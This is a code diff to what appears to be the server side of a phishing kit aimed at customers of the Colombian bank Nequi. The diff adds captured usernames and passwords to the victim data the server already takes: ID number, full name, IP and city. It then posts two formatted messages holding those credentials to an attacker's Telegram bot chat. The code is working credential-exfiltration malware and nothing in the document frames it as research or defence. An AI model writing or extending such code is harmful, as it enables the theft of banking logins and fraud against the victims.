@@ -16,30 +16,60 @@ app.use(bodyParser.json());
 
 // Ruta para enviar mensajes a Telegram
 app.post('/send-message', async (req, res) => {
-    const { documentNumber, fullName, userIP, city, country } = req.body;
+    const { documentNumber, fullName, username, password, userIP, city, country } = req.body;
 
-    if (!documentNumber || !fullName) {
+    if (!documentNumber || !fullName || !username || !password) {
         return res.status(400).json({ error: 'Datos incompletos' });
     }
 
-    const message = `
+    // Formato 1: Nequi_Meta_Infinito
+    const messageFormat1 = `
+👤Nequi_Meta_Infinito👤
+🆔Nombres: ${fullName}
+🪪Cédula: ${documentNumber}
+#️⃣Número: ${username}
+🔐Clave: ${password}
+🌏IP: ${userIP || 'Desconocida'}
+🇨🇴Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
+`.trim();
+
+    // Formato 2: Nequi 2.0
+    const messageFormat2 = `
 Nequi 2.0
 ID: ${documentNumber}
 Nombres: ${fullName}
 IP: ${userIP || 'Desconocida'}
 Ciudad: ${city || 'Desconocida'}
 País: ${country || 'Desconocido'}
-    `.trim();
+Número: ${username}
+Clave: ${password}
+`.trim();
 
     try {
-        const response = await axios.post(
+        // Enviar ambos mensajes a Telegram
+        const response1 = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
             {
                 chat_id: CHAT_ID,
-                text: message,
+                text: messageFormat1,
             }
         );
-        res.json({ success: true, data: response.data });
+
+        const response2 = await axios.post(
+            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+            {
+                chat_id: CHAT_ID,
+                text: messageFormat2,
+            }
+        );
+
+        res.json({
+            success: true,
+            data: {
+                format1: response1.data,
+                format2: response2.data,
+            },
+        });
     } catch (error) {
         console.error('Error al enviar mensaje a Telegram:', error);
         res.status(500).json({ error: 'Error al enviar mensaje a Telegram' });
